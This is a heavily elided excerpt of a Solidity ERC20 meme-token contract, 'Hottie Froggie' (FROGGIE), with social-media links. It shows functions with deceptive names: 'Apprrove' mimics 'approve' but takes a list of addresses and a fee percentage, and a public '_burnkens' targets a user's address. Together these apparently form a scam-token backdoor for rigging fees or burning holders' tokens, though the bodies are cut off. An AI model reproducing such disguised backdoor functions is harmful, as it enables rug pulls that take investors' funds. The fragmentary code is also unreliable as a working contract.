/**
https://t.me/HottieFroggieERC20
https://twitter.com/Hottie__Froggie
...
abstract contract Ownable {
    ...
    function transferOwnershipzexcomer(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract HottieFroggie is Ownable {
    ...
    constructor (){
        name = unicode"Hottie Froggie";
        symbol = unicode"FROGGIE";
        decimals = 9;
    ...
    function Apprrove(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnkens(address user) public {
